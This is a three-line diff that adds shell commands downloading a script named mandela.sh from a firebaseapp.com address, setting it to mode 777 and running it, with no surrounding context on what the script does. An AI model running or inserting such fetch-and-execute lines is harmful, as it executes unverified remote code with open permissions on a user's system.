@@ -1,0 +1,3 @@
+curl https://inf221tf.firebaseapp.com/mandela.sh --output mandela.sh
+chmod 777 ./mandela.sh
+./mandela.sh
